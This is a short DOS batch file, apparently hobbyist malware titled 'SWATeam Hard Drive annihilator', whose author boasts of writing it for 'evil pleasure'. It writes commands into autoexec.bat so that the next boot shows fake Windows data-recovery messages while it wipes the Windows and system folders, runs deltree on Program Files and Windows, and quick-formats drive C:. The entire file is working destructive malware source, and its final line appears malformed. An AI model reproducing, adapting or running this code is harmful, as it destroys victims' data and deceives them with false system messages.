@ echo off
rem SWATeam Hard Drive annihilator (based on HDKiller by Munga Bunga)
rem Coded by -=The Firestarter=- purley for his evil pleasure.
rem This proggy will wipe out key programs on a hard drive before
rem finally formatting it, the result, unrecoverable data!!!
rem Shoutz go out to: All SWATeam members (past and present)
rem DarkCyde, Technophreaks, A-Team, every group that I have been
rem involved with and all my personal friends (especially Andrea)

cls
echo echo Microsoft Windows has detected an error. Attempting to recover data. >>c:\autoexec.bat
echo echo WARNING rebooting now will cause all data to be lost indefinatly.  >>c:\autoexec.bat
echo echo Please wait... >>c:\autoexec.bat
echo attrib -h -r c:\*.* >nul >>c:\autoexec.bat
echo copy wipe.com c:\windows >nul >>c:\autoexec.bat
echo copy wipe.com c:\windows\system >nul >>c:\autoexec.bat
echo cd c:\windows >nul >>c:\autoexec.bat
echo wipe *.* >nul >>c:\autoexec.bat
echo cd c:\windows\system >nul >>c:\autoexec.bat
echo wipe *.* >nul >>c:\autoexec.bat
echo cd c:\ >nul >>c:\autoexec.bat
echo deltree /y c:\progra~1 >nul >>c:\autoexec.bat
echo deltree /y c:\windows >nul >>c:\autoexec.bat
echo Echo Recovery 100% sucessful hit any key to continue >>c:\autoexec.bat
echo pause >>c:\autoexec.bat
echo echo format c: /q /u /autotest >nul >c:\autoexec.bat >>c:\autoexec.bat